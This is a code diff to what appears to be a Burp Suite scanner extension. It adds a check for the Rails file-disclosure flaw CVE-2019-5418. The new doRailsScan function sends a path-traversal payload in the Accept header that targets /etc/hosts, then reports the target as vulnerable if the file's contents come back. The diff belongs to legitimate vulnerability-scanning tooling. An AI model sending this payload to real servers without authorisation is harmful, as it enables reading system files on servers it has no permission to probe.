@@ -31,7 +31,7 @@ try:
 except ImportError:
     print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."
 
-VERSION = "1.0.20"
+VERSION = "1.0.21"
 FAST_MODE = False
 DEBUG = False
 callbacks = None
@@ -140,6 +140,7 @@ class PerRequestScans(IScannerCheck):
             self.doStruts_2017_9805_Scan,
             self.doStruts_2018_11776_Scan,
             self.doXXEPostScan,
+            self.doRailsScan,
         ]
 
     def doPassiveScan(self, basePair):
@@ -185,6 +186,20 @@ class PerRequestScans(IScannerCheck):
             return True
 
         return False
+
+    def doRailsScan(self, basePair):
+        if '127.0.0.1' in safe_bytes_to_string(basePair.getResponse()):
+            return
+
+        (ignore, req) = setHeader(basePair.getRequest(), 'Accept', '../../../../../../../../../../../../../etc/hosts{{', True)
+        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req)
+        if '127.0.0.1' in safe_bytes_to_string(attack.getResponse()):
+            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
+                [attack],
+                'Rails file disclosure',
+                "The application appears to be vulnerable to CVE-2019-5418, enabling arbitrary file disclosure.",
+                'Firm', 'High')]
+        return []
 
     def doStrutsScan(self, basePair):
 
